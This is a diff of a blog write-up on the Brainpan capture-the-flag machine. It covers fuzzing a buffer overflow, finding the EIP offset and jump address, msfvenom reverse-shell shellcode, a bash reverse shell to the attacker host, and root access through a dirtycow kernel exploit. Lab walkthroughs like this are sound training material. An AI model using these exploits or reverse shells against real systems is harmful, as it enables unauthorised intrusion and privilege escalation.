@@ -9,10 +9,10 @@ draft: false
 ---
 
 ## Introduction:
-Brainpan took me hours over the span of two days. I found that I quickly gained access to the host but had to do a lot of research to escalate from an unprivileged account to root. Local scans made it seem like there maybe were a few ways to reach root though I ended up achieving the escalation via a kernel exploit.
+Brainpan was an interesting challenge as it had many pivots and took hours over the span of two days to complete. I found that I quickly gained access to the host but was stuck trying to find a way to excalate an unprivileged account to root. Local scans made it seem like there maybe were a few ways to reach root though I ended up achieving the escalation via a kernel exploit that I'd never had the opportunity to attempt yet.
 
 ## Environment
-The attack took place on a flat network consisting of the attack host, a freshly-booted Kali Linux livecd, and the target. I knew that there would most likely be an arbitrary service that would need to be exploited going into this attack but little else.
+The attack took place on a flat network consisting of the attack host, a freshly-booted Kali Linux livecd, and the target. I knew there would most likely be a buffer overflow exploit that would need to be exploited going into this attack, at some point, but little else.
 
 ## Attack
 Prior to starting the attack, I prepared my workstation by setting up burpsuite, including installing the requisite certificates in firefox. In addition, I also installed `jq`, [gobuster](https://github.com/OJ/gobuster) and the [seclists](https://github.com/danielmiessler/SecLists) wordlist collections.
@@ -109,14 +109,14 @@ _|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
 root@kali:~/ctf#
 ```
 
-While I knew there was more here, I had a feeling this could be a potential rabbithole without more information. I decided to crawl the webserver to see if I could learn anything more about the target before focusing on this any longer.
+While I knew there had to be more here, I had a feeling this could potentially be a rabbit hole without more information. I decided to crawl the webserver to see if I could learn anything more about the target before focusing on this any longer.
 
 ### Enumerating the webserver
 I opened site index to find a single image and little else. 
 
 ![brainpan http index](/img/brainpan_http_index.png)
 
-Probing around for an `robots.txt` or other common directories wasn't fruitful so I decided to run `gobuster` against the webserver with the `directories-2.3-medium.txt` wordlist to see if I could identify any less common directory names.
+Probing around for an `robots.txt` or other common directories yielded nothing so I decided to run `gobuster` against the webserver with the `directories-2.3-medium.txt` wordlist to see if I could identify any less common directory names.
 
 ```
 root@kali:~/ctf# gobuster dir -u 'http://10.10.42.127:10000/' -w /usr/share/seclists/Discovery/Web-Content/
@@ -141,7 +141,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 ```
 
-The scan returned a single directory, `/bin/` which contained a single executable file. Given the name of the file, I assumed this was the executable for the `brainpan` service running on port `9999` and give that it was an executable, assumed that I would be attacking a windows host.
+The scan returned a single directory, `/bin/` which contained a single executable file. Given the name of the file, I assumed this was the executable for the `brainpan` service running on port `9999` and given that it was a 32-bit windows executable, assumed that I would be attacking a windows host.
 
 ```
 root@kali:~/ctf# curl -sD - 'http://10.10.42.127:10000/bin/'
@@ -171,17 +171,17 @@ brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), 
 ```
 
 ### Pwning brainpan
-I assumed that I would need to identify and exploit a vulnerability in the `brainpan.exe` binary to make any futher progress onto the host. To facilitate this, I decided to setup an environment to begin fuzzing the service.
+Knowing there was a buffer overflow somewhere in this challege, I worked under the assumption that this was enough evidence to start investigating the `brainpan.exe` binary for a vulnerability that I could use to make any futher progress onto the host. To facilitate this, I decided to setup an environment to begin fuzzing the service.
 
 #### Setting up a testing environment
-I began by spinning up a Windows 7 VM with a host interface so I could easily interact with it from my attack host. I then installed Immunity Debugger, and [mona](https://github.com/corelan/mona) as I assumed that there would be a buffer overflow in the password input of the service.
+I began by spinning up a Windows 7 VM with a host interface so I could easily interact with it from my attack host. I then installed Immunity Debugger, and [mona](https://github.com/corelan/mona) as I assumed that there would be a buffer overflow in the input field of the service.
 
 ![immunity debugger](/img/brainpan_immunity_debugger.png)
 
-Finally, I setup a project directory in mona with `!mona config -set workingfolder c:\mona\%p` and confirmed that I could hit the local brainpan service with netcat.
+Finally, I setup a project directory in mona with `!mona config -set workingfolder c:\mona\%p` and confirmed that I could hit the local brainpan service with netcat via `nc 192.168.0.14 9999`.
 
 #### Fuzzing brainpan
-To start crafting the exploit, I opened up a shell in a `python:3` docker image and installed `pwntools`. I then created the following fuzzer script to inject an increasingly longer payload into the input prompt of the brainpan service to see if I could cause it to crash.
+To start crafting the exploit, I opened up a shell in a `python:3` docker image and installed `pwntools`. I then created the following fuzzer script to iterate over sending an increasingly long payload to the input prompt of the brainpan service with the hope of coaxing it to crash.
 
 
 ```python
@@ -237,7 +237,7 @@ root@00e35ba5ecd5:~# python3 fuzzer.py
 Could not connect to 192.168.0.14: 9999
 ```
 
-Running this script caused a crash with a 600 byte long payload and appeared to confirm my suspicion that this would be a simple overflow due to the instruction pointer (EIP) being overwritten with the value `41414141` or `AAAA`. 
+Running this script caused a crash with a 600 byte long payload and appeared to confirm my suspicion that this would be a simple overflow due to the instruction pointer (EIP) being overwritten with the value `41414141` or `AAAA`. After a few repeats, I could safely assume that the EIP sat at an offset between 500 and 600 bytes off from where the input was stored.
 
 ![fuzzer overflow](/img/brainpan_fuzzer_overflow.png)
 
@@ -289,7 +289,7 @@ sys.exit(0)
 ```
 
 #### Identifying the EIP offset
-Next was to identify the exact offset that began the overflow into the instruction pointer. To better identify this, I then decided to use a cyclical pattern as a payload, which I generated with the metasploit framework's `pattern_create.rb` script.
+Next, I needed to identify the exact offset that began the overflow into the instruction pointer. To better identify this, I then decided to use a cyclical pattern as a payload, which I generated with the metasploit framework's `pattern_create.rb` script. These work by generating a unique sequence of characters allowing the offset to be derived by the values visible at any location in the payload.
 
 ```
 root@kali:~/ctf# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
@@ -312,12 +312,12 @@ Rerunning the script confirmed again that the EIP was overwritten and using the 
 
 ![mona findmsp](/img/brainpan_mona_findmsp.png)
 
-This showed that the EIP offset was at `524` bytes so I updated the `offset` variable in my exploit and set the `retn` variable to `BBBB` to confirm that I could overwrite the EIP with a known value, in this case `BBBB` or `42424242`. Rerunning the exploit quickly confirmed this.
+This showed that the EIP offset was at `524` bytes so I updated the `offset` variable in my exploit to reflect this and, additionally, set the `retn` variable to `BBBB` to confirm that I could overwrite the EIP with a known value, in this case `BBBB` or `42424242`. Rerunning the exploit quickly confirmed this.
 
 ![overwrite EIP](/img/brainpan_overwrite_EIP_with_offset.png)
 
 #### Identifying bad characters
-Now that I had control of the EIP, I needed to validate that there were no bad characters that could cause termination or corruption of the input. I began by generating a 254-byte array of characters from `0x01` - `0xFF` using a short python script. `0x00` was excluded under the assumption that this was already a "bad" termination character.
+Now that I had control of the EIP, I needed to validate that there were no values, or bad characters, that could cause termination or corruption of the input. I generated a 254-byte array ranging from `0x01` - `0xFF` using a short python script. `0x00` was excluded under the assumption that this was already a "bad" null termination character.
 
 ```python
 #!/usr/bin/env python3
@@ -328,7 +328,7 @@ print("")
 ```
 
 ```
-> python3 thm/oscp_bof_prep/bytearraygen/bytearraygen.py 
+> python3 bytearraygen.py 
 \x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
 ```
 
@@ -343,21 +343,21 @@ Running a compare against the address at the stack pointer confirmed that there 
 
 ![mona bad_char comparison](/img/brainpan_mona_badchar_comparison.png)
 
-I added the nullbyte to my `bad_chars` variable for documentation and cleared the bytearray payload.
+I added the null byte to my `bad_chars` variable for documentation and cleared the bytearray payload.
 
 ```python
 bad_chars = "\x00"
 ```
 
 #### Identifying a jump point
-Finally to complete the exploit, I needed a jmp instruction without ASLR/PIE that I could use to hijack command execution. I ran the `!mona jmp -r esp -cpb "\x00"` command, passing the null byte as a bad char and it quickly identified a single instruction address that I could use `0x311712f3`. I converted the address to little-endian format to conform to the targets architecture and updated the `retn` variable in my exploit to point to the jump.
+Finally to complete the exploit, I needed a jmp instruction without ASLR/PIE that I could use to hijack command execution. I ran the `!mona jmp -r esp -cpb "\x00"` command, passing the null byte as a bad char and it quickly identified a single instruction address that I could use `0x311712f3`. I converted the address to little-endian format to conform to the target's architecture and updated the `retn` variable in my exploit to point to the jump.
 
 ```python
 retn = "\xf3\x12\x17\x31"
 ```
 
 #### Generating a test payload
-With all the components to exploit the target in place, I needed shellcode to confirm I could get remote code execution on the service. I used msfvenom to create a small payload to run calc.exe.
+With all the components to exploit the target in place, I now only needed shellcode to confirm I could get remote code execution on the service. I used msfvenom to create a small payload to run calc.exe. Should everything work successfully, this would cause calc.exe to open on my test environments desktop.
 
 ```
 root@kali:~/ctf# msfvenom -p windows/exec CMD=calc.exe -b "x00" -f python -v payload | sed 's/b"/"/'
@@ -468,7 +468,7 @@ I executed the new payload and was pleased to confirm that I had RCE.
 ![pop calc](/img/brainpan_pop_calc.png)
 
 #### Generating a test shell payload
-Now that I had code execution, I needed shellcode that was performed more useful actions than opening the calculator on my desktop. I generated a reverse shell to my local test environment similarly to how I had generated the `cmd/exec` shellcode.
+Now that I had code execution, I needed shellcode that performed a more useful action than opening a calculator on my desktop. I generated a reverse shell to my local test environment similarly to how I had generated the `cmd/exec` shellcode.
 
 ```
 root@kali:~/ctf# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.13 LPORT=4444 -v payload -b '\x00' -f python | sed 's/b"/"/'
@@ -513,7 +513,7 @@ payload += "\xec\xcd\xc9\xd1\xe9\x8a\x4d\x0a\x80\x83\x3b\x2c"
 payload += "\x37\xa3\x69"
 ```
 
-Again, I replaced the previous shellcode with the above payload before opening up a netcat listener on my local desktop. Upon running the exploit I was happy to see that my listener caught a shell.
+Again, I replaced the previous shellcode with the above payload before opening up a netcat listener on my local desktop. Upon running the exploit, I was happy to see that my listener caught a shell.
 
 ```
 ~> nc -lvnp 4444
@@ -627,7 +627,7 @@ Directory of Z:\home\puck
 While this shell appeared to be a `CMD` shell the directory structure and files immediately did not look like a windows environment. Enumeration quickly confirmed this was not a bog standard windows host.
 
 ### Enumerating the Host
-Quickly it became clear that this was either a linux host, or at a minimum a mount to a linux volume.
+It was clear that this was either a linux host somehow running `CMD`, or at a minimum a mount to a linux volume.
 
 ```
 Z:\>dir
@@ -663,7 +663,7 @@ Directory of Z:\
 
 With a little digging, I was excited to find that I could execute commands on this linux machine. With this in mind I decided to leverage a reverse bash shell to migrate into the underlying linux host.
 
-To facilitate this, I generated the shell using msfvenom again before executing this using this directly through `bash`.
+To facilitate this, I generated the shell using msfvenom again before executing this directly through `bash`.
 
 ```
 root@kali:~/ctf# msfvenom -p cmd/unix/reverse_bash LHOST=10.10.176.118 LPORT=4443
@@ -712,10 +712,10 @@ whoami
 puck
 ```
 
-Again I caught a raw shell via a listening netcat instance.
+Again I caught a raw shell via a listening `netcat` instance.
 
 ### Stabilizing my limited shell to a full TTY
-Given I could be on this shell a while, I wanted to stabilize it to something I couldn't accidentally blow away with a rogue `^c`. I found that the host had python 2.7 on it and decided to use the `import pty` trick to migrate this shell into a new pty.
+Given I could be on this shell a while, I wanted to stabilize it to something I couldn't accidentally blow away with a rogue `^c`. I knew that the host had python 2.7 on it from the earlier `nmap` scans and decided to use the `import pty` trick to migrate this shell into a new pty.
 
 ```
 python --version
@@ -800,7 +800,7 @@ Linux brainpan 3.5.0-25-generic #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 i686
 ```
 
 ### Building dirtycow
-I decided to reach for the original Christian "FireFart" Mehlmauer implementation of dirtycow because it generated a new user that collided with the root uid/gid, effetively giving me a root user. I pulled down the C code from his repo and fetched the x86 dependencies I needed to build it. My plan was to build a statically linked binary that I could just drop on the host to make my life the easier.
+I decided to reach for the original Christian "FireFart" Mehlmauer implementation of dirtycow because it generated a new user that collided with the root uid/gid, effectively giving me access to a root user. I pulled down the C code from his repo and fetched the x86 dependencies I needed to build it, planning to build a statically linked binary that I could just drop on the host to make my life the easier.
 
 ```
 root@kali:~/ctf# wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
@@ -896,4 +896,4 @@ cb@brainpan:~#
 SUCCESS! My `cb` user had root permissions and I was able to reach the `/root` directory where I happily viewed the `b.txt` file.
 
 ## Summary
-This host ended up being a rollercoaster having a twist at effectively every step of the attack. I especially enjoyed being able to leverage and old smash-the-stack overflow to gain initial access. To date, this is my favorite boot2root that I've had the pleasure to work through.
+This host ended up being a rollercoaster having a twist at effectively every step of the attack. I especially enjoyed being able to leverage and old smash-the-stack overflow to gain initial access. To date, this is my favorite boot2root that I've had the pleasure of working through.
